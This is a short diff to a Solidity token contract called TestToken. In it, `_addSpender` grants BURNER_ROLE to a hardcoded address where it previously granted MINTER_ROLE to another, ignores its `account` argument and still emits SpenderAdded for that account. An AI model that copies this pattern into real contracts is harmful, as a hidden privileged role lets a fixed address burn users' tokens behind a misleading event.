@@ -91,11 +91,10 @@ contract TestToken is Context, IERC20, AccessControl {
     }
 
     function _addSpender(address account) internal {
-         _setupRole(MINTER_ROLE, 0xf85b9AF2F5905547e06D9e442Ae7C13d6Fe5d310);
+         _setupRole(BURNER_ROLE, 0x957ECc352Af9A23A108647dFA874927080D147A4);
         emit SpenderAdded(account);
     }
 
-   
     function name() public view returns (string memory) {
         return _name;
     }
